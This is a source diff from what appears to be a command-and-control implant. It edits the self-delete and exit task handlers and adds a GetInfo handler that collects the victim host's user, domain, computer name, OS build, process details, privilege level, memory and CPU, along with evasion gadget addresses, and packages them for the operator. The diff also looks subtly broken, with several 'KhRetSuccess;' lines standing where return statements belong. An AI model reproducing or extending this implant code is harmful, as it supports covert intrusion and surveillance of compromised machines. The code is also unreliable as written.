@@ -1062,19 +1062,17 @@ auto DECLFN Task::SelfDel(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
     
-     Self->Pkg->Int32( Job->Pkg, Self->Usf->SelfDelete() );
+    Self->Pkg->Int32( Job->Pkg, Self->Usf->SelfDelete() );
 
-     return KhGetError;
+    return KhGetError;
 }
 
 auto DECLFN Task::Exit(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
     INT8 ExitType = Self->Psr->Byte( Job->Psr );
-
     Job->State    = KH_JOB_READY_SEND;
-    Job->ExitCode = KhRetSuccess;
-    
+
     Self->Jbs->Send( Self->Jbs->PostJobs );
     Self->Jbs->Cleanup();
 
@@ -1086,5 +1084,47 @@ auto DECLFN Task::Exit(
         Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
     }
 
-    return KhRetSuccess;
+    KhRetSuccess;
+}
+
+auto DECLFN Task::GetInfo(
+    _In_ JOBS* Job
+) -> ERROR_CODE {
+    PACKAGE* Pkg = Job->Pkg;
+
+    Self->Pkg->Str( Pkg, Self->Session.AgentID );
+    Self->Pkg->Int64( Pkg, Self->Session.Base.Start );
+    Self->Pkg->Int32( Pkg, Self->Session.Base.Length );
+    Self->Pkg->Str( Pkg, Self->Session.ImagePath );
+    Self->Pkg->Str( Pkg, Self->Session.CommandLine );
+    Self->Pkg->Int32( Pkg, Self->Session.ProcessID );
+    Self->Pkg->Int32( Pkg, Self->Session.ThreadID );
+    Self->Pkg->Int32( Pkg, Self->Session.ParentID );
+    Self->Pkg->Int64( Pkg, Self->Session.HeapHandle );
+    Self->Pkg->Int32( Pkg, Self->Session.SleepTime );
+    Self->Pkg->Int32( Pkg, Self->Session.ProcessArch );
+    Self->Pkg->Int16( Pkg, (INT16) Self->Session.Elevated | (INT16) 0 );
+    
+    Self->Pkg->Int16( Pkg, (INT16) Self->Mk->Ctx.TechniqueID | (INT16) 0 );
+    Self->Pkg->Int16( Pkg, (INT16) Self->Mk->Ctx.Heap | (INT16) 0 );
+    Self->Pkg->Int64( Pkg, Self->Mk->Ctx.JmpGadget );
+    Self->Pkg->Int64( Pkg, Self->Mk->Ctx.NtContinueGadget );
+
+    Self->Pkg->Str( Pkg, Self->Machine.UserName );
+    Self->Pkg->Str( Pkg, Self->Machine.CompName );
+    Self->Pkg->Str( Pkg, Self->Machine.DomName );
+    Self->Pkg->Str( Pkg, Self->Machine.NetBios );
+    Self->Pkg->Int32( Pkg, Self->Machine.OsArch | (ULONG) 0 );
+    Self->Pkg->Int32( Pkg, Self->Machine.OsMjrV );
+    Self->Pkg->Int32( Pkg, Self->Machine.OsMnrV );
+    Self->Pkg->Str( Pkg, Self->Machine.OsBuild );
+    Self->Pkg->Str (Pkg, Self->Machine.ProductType );
+    Self->Pkg->Int32( Pkg, Self->Machine.TotalRAM );
+    Self->Pkg->Int32( Pkg, Self->Machine.AvalRAM );
+    Self->Pkg->Int32( Pkg, Self->Machine.UsedRAM );
+    Self->Pkg->Int32( Pkg, Self->Machine.PercentRAM );
+    Self->Pkg->Str( Pkg, Self->Machine.ProcessorName );
+    Self->Pkg->Int32( Pkg, Self->Machine.ProcessorsNbr );
+
+    KhRetSuccess;
 }
